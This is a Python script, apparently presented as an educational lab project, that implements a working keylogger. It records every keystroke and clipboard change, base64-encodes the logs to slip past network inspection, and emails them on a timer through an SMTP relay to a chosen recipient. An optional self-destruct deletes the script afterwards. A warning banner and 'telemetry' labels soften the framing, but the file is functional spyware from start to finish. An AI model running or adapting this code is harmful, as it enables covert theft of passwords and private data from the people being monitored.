#!/usr/bin/env python3
"""
Project #10: Keylogger with Email Exfiltration (Educational Lab Only)
Architecture: Multi-threaded listener loops with encrypted SMTP transport.
"""

import os
import sys
import time
import ssl
import smtplib
import argparse
import threading
import base64
from email.mime.text import MIMEText
from typing import Optional

# Conditional import to handle cross-platform environments smoothly
try:
    from pynput import keyboard
except ImportError:
    print("[-] Missing dependency: pip install pynput")
    sys.exit(1)

try:
    import pyperclip
except ImportError:
    # Fallback if clipboard tools are missing on headless Linux
    pyperclip = None

BANNER = """
======================================================================
  ETHICAL WARNING: For authorized endpoint monitoring labs only.
  This software logs sensitive input data and telemetry. Do not run 
  outside dedicated private research environments.
======================================================================
"""

class TelemetryFramework:
    def __init__(self, smtp_host: str, smtp_port: int, email_user: str, email_pass: str, receiver: str, interval: int) -> None:
        self.smtp_host = smtp_host
        self.smtp_port = smtp_port
        self.email_user = email_user
        self.email_pass = email_pass
        self.receiver = receiver
        self.interval = interval
        
        self.log_buffer = ""
        self.last_clipboard = ""
        self.is_running = True
        self.lock = threading.Lock()

    def append_to_buffer(self, text: str) -> None:
        with self.lock:
            self.log_buffer += text

    def process_key_stroke(self, key) -> Optional[bool]:
        # Global stop check condition (F9 Key)
        if key == keyboard.Key.f9:
            print("\n[!] Exit trigger received. Halting threads...")
            self.is_running = False
            return False # Gracefully stops the pynput listener loop

        try:
            self.append_to_buffer(key.char)
        except AttributeError:
            # Handle special functional system keys elegantly
            if key == keyboard.Key.space:
                self.append_to_buffer(" ")
            elif key == keyboard.Key.enter:
                self.append_to_buffer("[ENTER]\n")
            elif key == keyboard.Key.backspace:
                self.append_to_buffer("[BACKSPACE]")
            else:
                self.append_to_buffer(f"[{key.name.upper()}]")

    def monitor_clipboard(self) -> None:
        """Polls the local system clipboard interface for telemetry data changes."""
        if not pyperclip:
            return
            
        while self.is_running:
            try:
                current_clip = pyperclip.paste()
                if current_clip != self.last_clipboard and current_clip.strip() != "":
                    self.last_clipboard = current_clip
                    self.append_to_buffer(f"\n\n[CLIPBOARD CAPTURE: {time.strftime('%H:%M:%S')}] {current_clip}\n\n")
            except Exception:
                pass
            time.sleep(2) # Limit processor utilization overhead

    def obfuscate_payload(self, data: str) -> str:
        """Encodes log data using standard base64 strings to evade cleartext network signatures."""
        return base64.b64encode(data.encode('utf-8')).decode('utf-8')

    def transmit_exfiltration_package(self) -> None:
        """Establishes safe SMTP pipelines and flushes the data payload downstream."""
        while self.is_running:
            time.sleep(self.interval)
            
            with self.lock:
                if not self.log_buffer:
                    continue
                current_payload = self.log_buffer
                self.log_buffer = "" # Flush memory buffer space immediately

            # Package creation steps
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            body_content = f"Telemetry Sync Phase: {timestamp}\nData Stream:\n{current_payload}"
            protected_body = self.obfuscate_payload(body_content)

            msg = MIMEText(protected_body)
            msg['Subject'] = f"Security Telemetry Report - Host Sync Node"
            msg['From'] = self.email_user
            msg['To'] = self.receiver

            try:
                # Negotiate secure TLS connection state mechanics
                context = ssl.create_default_context()
                with smtplib.SMTP(self.smtp_host, self.smtp_port, timeout=10) as server:
                    server.starttls(context=context)
                    server.login(self.email_user, self.email_pass)
                    server.sendmail(self.email_user, self.receiver, msg.as_string())
                print(f"🎉 [EXFIL] Telemetry package transmitted successfully at {timestamp}")
            except Exception as e:
                print(f"⚠️ [EXFIL-ERROR] Data transmission line failed: {e}")
                # Return data back to buffer pool so it isn't lost during an outage
                with self.lock:
                    self.log_buffer = current_payload + self.log_buffer

def trigger_self_destruct() -> None:
    """Removes all file remnants of the active execution context from storage media."""
    try:
        script_path = os.path.abspath(sys.argv[0])
        print(f"💥 [SELF-DESTRUCT] Unlinking application profile at: {script_path}")
        os.remove(script_path)
        print("[+] Storage unlinked successfully. Process terminated safely.")
    except Exception as e:
        print(f"[-] Self-destruct mechanism failed to unlink file target: {e}")

if __name__ == "__main__":
    print(BANNER)
    parser = argparse.ArgumentParser(description="Telemetry Layer Engine")
    parser.add_argument("--server", default="smtp.gmail.com", help="Exfiltration SMTP target relay host")
    parser.add_argument("--port", type=int, default=587, help="SMTP Port layer (Standard: 587)")
    parser.add_argument("--user", required=True, help="Authentication entry profile user name")
    parser.add_argument("--password", required=True, help="Authentication dynamic app token key string")
    parser.add_argument("--to", required=True, help="Destination analyst email repository address")
    parser.add_argument("--seconds", type=int, default=60, help="Interval window loop tracking timer bounds")
    parser.add_argument("--self-destruct", action="store_true", help="Unlink script execution file immediately on completion")
    args = parser.parse_args()

    framework = TelemetryFramework(args.server, args.port, args.user, args.password, args.to, args.seconds)

    # Initialize non-blocking worker threads for concurrent telemetry collection
    clip_thread = threading.Thread(target=framework.monitor_clipboard, daemon=True)
    exfil_thread = threading.Thread(target=framework.transmit_exfiltration_package, daemon=True)
    
    clip_thread.start()
    exfil_thread.start()

    # Enter keyboard monitor foreground capture execution block
    with keyboard.Listener(on_press=framework.process_key_stroke) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[!] Program interrupted manually via keyboard sequence.")
        finally:
            framework.is_running = False

    if args.self_destruct:
        trigger_self_destruct()